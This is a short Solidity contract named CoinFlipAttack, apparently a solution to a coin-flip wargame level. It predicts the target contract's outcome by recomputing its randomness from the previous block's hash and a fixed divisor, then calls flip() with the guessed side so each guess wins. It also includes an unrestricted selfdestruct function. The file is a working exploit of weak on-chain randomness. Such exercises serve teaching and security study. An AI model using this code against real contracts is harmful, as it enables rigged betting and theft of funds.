//SDPX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './safemath.sol';

// Import the interface for the original CoinFlip contract
// so we can invoke the flip method from this contract
import 'interfaces/coinflipInterface.sol';

contract CoinFlipAttack {
    // Our object to the interface;
    CoinFlipInterface coinflipContract;

    // Mimic the logic
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // constructor
    constructor(address _address) public {
        coinflipContract = CoinFlipInterface(_address);
    }

    // Function that recreates the contract's logic and pass the expected value
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        
        bool side = coinFlip == 1 ? true : false;
        bool result = coinflipContract.flip(side);

        require(result);
    }

    // Destructor
    function destroy() public {
        selfdestruct(msg.sender);
    }
     
}